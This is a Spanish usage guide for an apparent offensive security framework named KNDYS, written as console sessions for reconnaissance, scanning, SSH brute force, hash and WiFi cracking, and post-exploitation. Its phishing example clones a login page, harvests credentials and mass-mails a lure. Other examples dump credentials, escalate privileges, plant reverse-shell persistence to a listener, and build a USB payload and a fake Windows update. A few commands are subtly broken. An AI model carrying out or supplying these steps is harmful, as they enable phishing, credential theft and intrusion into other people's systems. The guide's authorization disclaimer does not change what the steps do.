# KNDYS Framework - Ejemplos de Uso Práctico

Este archivo contiene ejemplos paso a paso para usar los módulos más comunes del framework KNDYS.

---

## Ejemplo 1: Reconocimiento Básico de un Objetivo

### Objetivo: Recopilar información sobre example.com

```bash
# Iniciar KNDYS
./kndys.py

# Paso 1: Escanear puertos
kndys> use port_scanner
kndys(port_scanner)> set target example.com
kndys(port_scanner)> set threads 50
kndys(port_scanner)> run

# Resultado esperado: Puertos abiertos (80, 443, etc.)

# Paso 2: Descubrir subdominios
kndys> use subdomain_scanner
kndys(subdomain_scanner)> set target example.com
kndys(subdomain_scanner)> set wordlist large
kndys(subdomain_scanner)> run

# Resultado esperado: Subdominios encontrados (api.example.com, admin.example.com, etc.)

# Paso 3: Obtener información del sitio web
kndys> use web_crawler
kndys(web_crawler)> set target http://example.com
kndys(web_crawler)> set depth 3
kndys(web_crawler)> run

# Resultado esperado: Mapa completo del sitio, formularios, parámetros
```

---

## Ejemplo 2: Escaneo de Vulnerabilidades Web

### Objetivo: Escanear example.com en busca de vulnerabilidades

```bash
kndys> use vuln_scanner
kndys(vuln_scanner)> set target http://example.com
kndys(vuln_scanner)> set scan_type full
kndys(vuln_scanner)> set output_file vuln_results.txt
kndys(vuln_scanner)> run

# Luego, escaneos específicos:

# Buscar inyecciones SQL
kndys> use sql_scanner
kndys(sql_scanner)> set target http://example.com/search?q=test
kndys(sql_scanner)> run

# Buscar XSS
kndys> use xss_scanner
kndys(xss_scanner)> set target http://example.com
kndys(xss_scanner)> set type reflected
kndys(xss_scanner)> run

# Verificar configuración SSL/TLS
kndys> use ssl_scanner
kndys(ssl_scanner)> set target example.com:443
kndys(ssl_scanner)> run
```

---

## Ejemplo 3: Ataque de Red Local (Requiere Lab Controlado)

### Objetivo: Interceptar tráfico en red local

```bash
# NOTA: Solo en laboratorio autorizado. Necesitas privilegios de root/admin.

sudo ./kndys.py

# Paso 1: Mapear la red
kndys> use network_mapper
kndys(network_mapper)> set target 192.168.1.0/24
kndys(network_mapper)> set method arp
kndys(network_mapper)> run

# Resultado: Dispositivos en la red

# Paso 2: Capturar tráfico
kndys> use packet_sniffer
kndys(packet_sniffer)> set interface eth0
kndys(packet_sniffer)> set filter http
kndys(packet_sniffer)> set packet_count 50
kndys(packet_sniffer)> run

# Resultado: Tráfico HTTP capturado
```

---

## Ejemplo 4: Cracking de Credenciales

### Objetivo: Probar contraseñas contra servicio SSH

```bash
# Crear archivo con usuarios (users.txt)
echo "admin\nroot\ntest" > users.txt

# Crear archivo con contraseñas (passwords.txt)
echo "123456\npassword\nadmin" > passwords.txt

# Ejecutar ataque de fuerza bruta
kndys> use brute_force
kndys(brute_force)> set target 192.168.1.100:22
kndys(brute_force)> set service ssh
kndys(brute_force)> set usernames users.txt
kndys(brute_force)> set passwords passwords.txt
kndys(brute_force)> set threads 5
kndys(brute_force)> run

# Si tenemos un hash:
kndys> use hash_cracker
kndys(hash_cracker)> set hash_value "5f4dcc3b5aa765d61d8327deb882cf99"
kndys(hash_cracker)> set hash_type md5
kndys(hash_cracker)> set wordlist rockyou.txt
kndys(hash_cracker)> run
```

---

## Ejemplo 5: Campaña de Phishing

### Objetivo: Crear página de captura para phishing

```bash
# Paso 1: Clonar sitio objetivo
kndys> use website_cloner
kndys(website_cloner)> set target http://example.com/login
kndys(website_cloner)> set output_dir phishing_site
kndys(website_cloner)> set modify_links true
kndys(website_cloner)> run

# Paso 2: Crear recolector de credenciales
kndys> use credential_harvester
kndys(credential_harvester)> set template custom
kndys(credential_harvester)> set html_file phishing_site/index.html
kndys(credential_harvester)> set listener_ip 192.168.1.100
kndys(credential_harvester)> set listener_port 8000
kndys(credential_harvester)> run

# Paso 3: Enviar correos
kndys> use mass_mailer
kndys(mass_mailer)> set email_list targets.txt
kndys(mass_mailer)> set subject "Verify Your Account"
kndys(mass_mailer)> set body_file email.txt
kndys(mass_mailer)> set link http://192.168.1.100:8000
kndys(mass_mailer)> run

# Resultado: Credenciales capturadas en servidor listener
```

---

## Ejemplo 6: Generar Reporte de Hallazgos

### Objetivo: Crear reporte profesional

```bash
# Después de ejecutar escaneos, generar reporte
kndys> use report_generator
kndys(report_generator)> set scan_file scan_results.json
kndys(report_generator)> set format html
kndys(report_generator)> set output_file reporte_final.html
kndys(report_generator)> set client_name "Acme Corporation"
kndys(report_generator)> set assessment_date "2025-01-15"
kndys(report_generator)> set severity_breakdown true
kndys(report_generator)> run

# Se genera archivo HTML profesional con todos los hallazgos
```

---

## Ejemplo 7: Análisis WiFi

### Objetivo: Auditar red WiFi (laboratorio controlado)

```bash
# Necesita interfaz WiFi en modo monitor
sudo ./kndys.py

# Paso 1: Descubrir redes WiFi
kndys> use wifi_scanner
kndys(wifi_scanner)> set interface wlan0
kndys(wifi_scanner)> set scan_time 20
kndys(wifi_scanner)> run

# Paso 2: Crackear contraseña WiFi
kndys> use wifi_cracker
kndys(wifi_cracker)> set target_ssid "MyNetwork"
kndys(wifi_cracker)> set target_bssid "AA:BB:CC:DD:EE:FF"
kndys(wifi_cracker)> set wordlist rockyou.txt
kndys(wifi_cracker)> set interface wlan0
kndys(wifi_cracker)> run

# Resultado: Contraseña encontrada
```

---

## Ejemplo 8: Post-Explotación

### Objetivo: Mantener acceso y escalar privilegios

```bash
# Después de obtener acceso inicial a máquina remota

# Paso 1: Extraer credenciales
kndys> use credential_dumper
kndys(credential_dumper)> set target_host 192.168.1.100
kndys(credential_dumper)> set username compromised_user
kndys(credential_dumper)> set password password123
kndys(credential_dumper)> set method ntlm
kndys(credential_dumper)> run

# Paso 2: Escalar privilegios
kndys> use privilege_escalation
kndys(privilege_escalation)> set target_host 192.168.1.100
kndys(privilege_escalation)> set username compromised_user
kndys(privilege_escalation)> set method sudo
kndys(privilege_escalation)> run

# Paso 3: Establecer persistencia
kndys> use persistence
kndys(persistence)> set target_host 192.168.1.100
kndys(persistence)> set method reverse_shell
kndys(persistence)> set listener_ip 192.168.1.50
kndys(persistence_port)> set listener_port 4444
kndys(persistence)> run

# Paso 4: Pivotear a otras máquinas
kndys> use pivot
kndys(pivot)> set compromised_host 192.168.1.100
kndys(pivot)> set target_network 192.168.2.0/24
kndys(pivot)> set pivot_method proxy
kndys(pivot)> run
```

---

## Ejemplo 9: Análisis Forense

### Objetivo: Recolectar evidencia

```bash
# Recolectar evidencia de una máquina comprometida
kndys> use evidence_collector
kndys(evidence_collector)> set target_host 192.168.1.100
kndys(evidence_collector)> set username admin
kndys(evidence_collector)> set password admin123
kndys(evidence_collector)> set collection_type full
kndys(evidence_collector)> set output_dir /evidence/machine1/
kndys(evidence_collector)> run

# Resultado: Carpeta con toda la evidencia recolectada
# - Logs del sistema
# - Historial de archivos
# - Conexiones de red
# - Procesos activos
# - Información de usuarios
```

---

## Ejemplo 10: Generar Payload Personalizado

### Objetivo: Crear payload reverse shell

```bash
# Generar payload USB malicioso
kndys> use usb_payload
kndys(usb_payload)> set payload_type reverse_shell
kndys(usb_payload)> set listener_ip 192.168.1.50
kndys(usb_payload)> set listener_port 4444
kndys(usb_payload)> set output_file payload.bin
kndys(usb_payload)> run

# O generar actualización falsa
kndys> use fake_update
kndys(fake_update)> set target_os windows
kndys(fake_update)> set payload reverse_shell
kndys(fake_update)> set listener_ip 192.168.1.50
kndys(fake_update)> set listener_port 4444
kndys(fake_update)> run

# Resultado: Ejecutable generado que despliega un reverse shell
```

---

## Comandos Útiles en Consola KNDYS

```bash
# Ver ayuda
kndys> help

# Ver todos los módulos
kndys> show modules

# Buscar módulos específicos
kndys> search scanner
kndys> search wifi

# Ver información del módulo
kndys> info port_scanner

# Cambiar module
kndys> use subdomain_scanner

# Ver opciones actuales del módulo
kndys(subdomain_scanner)> show options

# Ver valor de una opción
kndys(subdomain_scanner)> get target

# Establecer opción
kndys(subdomain_scanner)> set target example.com

# Desestablecer opción (volver a valor por defecto)
kndys(subdomain_scanner)> unset target

# Limpiar todas las opciones
kndys(subdomain_scanner)> clear

# Ejecutar módulo
kndys(subdomain_scanner)> run

# Volver al menú anterior
kndys(subdomain_scanner)> back

# Ver historial de comandos
kndys> history

# Salir de KNDYS
kndys> exit
```

---

## Notas Importantes

- **Autorización:** Siempre obtén autorización escrita antes de realizar pruebas de seguridad.
- **Legales:** El uso no autorizado de estas herramientas es ilegal.
- **Laboratorio:** Práctica primero en un laboratorio controlado.
- **Logs:** Revisa los logs para depurar problemas.
- **Performance:** Ajusta threads según tu red y recursos.
- **Proxies:** Usa proxies/VPN para test en redes públicas.

---

**Última Actualización:** Enero 2025  
**Versión:** 3.2
